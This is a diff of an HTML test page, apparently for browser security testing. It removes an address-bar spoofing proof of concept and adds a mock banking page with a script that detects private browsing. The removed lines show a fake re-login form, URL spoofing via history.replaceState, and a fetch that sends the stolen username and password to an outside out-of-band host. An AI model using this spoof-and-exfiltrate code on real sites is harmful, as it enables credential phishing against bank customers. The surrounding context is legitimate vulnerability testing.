@@ -1,43 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Secure Banking Portal</title>
+    <title>Sensitive Banking Site</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
-    <div id="content">
-        <h2>Welcome to Secure Bank</h2>
-        <p>Loading your account...</p>
+    <div style="padding: 20px; font-family: Arial;">
+        <h2>Private Banking Portal</h2>
+        <p>Welcome to your secure banking session. This page contains sensitive financial information.</p>
+        
+        <div id="sensitiveData" style="background: #f5f5f5; padding: 15px; margin: 10px 0; border-radius: 5px;">
+            <h3>Account Summary</h3>
+            <p><strong>Account Holder:</strong> John Doe</p>
+            <p><strong>Account Number:</strong> XXXX-XXXX-1234</p>
+            <p><strong>Balance:</strong> $25,430.75</p>
+            <p><strong>Recent Transactions:</strong></p>
+            <ul>
+                <li>Transfer to Jane Smith - $500.00</li>
+                <li>Amazon Purchase - $89.99</li>
+                <li>Salary Deposit - $4,200.00</li>
+            </ul>
+        </div>
+
+        <div style="margin-top: 20px;">
+            <h3>External Links (Right-click → "Open in New Private Window")</h3>
+            <a href="https://public-forum.com/discussion/123" target="_blank" style="display: block; margin: 10px 0;">
+                Public Forum Discussion
+            </a>
+            <a href="https://news-site.com/article/sensitive" target="_blank" style="display: block; margin: 10px 0;">
+                News Article with Sensitive Info
+            </a>
+        </div>
     </div>
 
     <script>
-        // POC: URL Bar Spoof - Network Change Race Condition
-        const spoofURL = 'https://real-bank.com';
-        const fakeContent = 'https://fake-phishing.com';
+        // Track if page is loaded in private browsing mode
+        function checkPrivacyContext() {
+            // Method to detect private browsing (may vary by browser)
+            const isPrivate = window.webkitRequestFileSystem ? 
+                new Promise(resolve => {
+                    window.webkitRequestFileSystem(0, 1, 
+                        () => resolve(false), 
+                        () => resolve(true)
+                    );
+                }) : Promise.resolve(false);
 
-        // Trigger on network change
-        window.addEventListener('online', startSpoof);
-
-        function startSpoof() {
-            // Freeze URL bar showing legitimate site
-            history.replaceState({}, '', spoofURL);
-            
-            // Replace page content with phishing site
-            document.body.innerHTML = `
-                <h1>Security Verification Required</h1>
-                <p>Please re-login after network restoration</p>
-                <input id="user" placeholder="Username">
-                <input id="pass" type="password" placeholder="Password">
-                <button onclick="steal()">Verify Identity</button>
-            `;
+            isPrivate.then(privateMode => {
+                if (!privateMode) {
+                    console.warn('⚠️ PRIVACY LEAK: Sensitive content loaded in normal browsing mode');
+                    document.getElementById('sensitiveData').style.border = '2px solid red';
+                    
+                    // Log the privacy violation
+                    const leakData = {
+                        type: 'privacy_leak',
+                        url: window.location.href,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent,
+                        expected: 'private_browsing',
+                        actual: 'normal_browsing'
+                    };
+                    
+                    // In real scenario, this would be reported to security team
+                    console.log('Privacy Violation Detected:', leakData);
+                }
+            });
         }
 
-        function steal() {
-            const user = document.getElementById('user').value;
-            const pass = document.getElementById('pass').value;
-            // Send stolen credentials
-            fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/log?u=' + user + '&p=' + pass);
-            alert('Verification failed. Please try again.');
-        }
+        // Check on page load
+        document.addEventListener('DOMContentLoaded', checkPrivacyContext);
+        
+        // Also check when page becomes visible (tab switch)
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                checkPrivacyContext();
+            }
+        });
     </script>
 </body>
 </html>
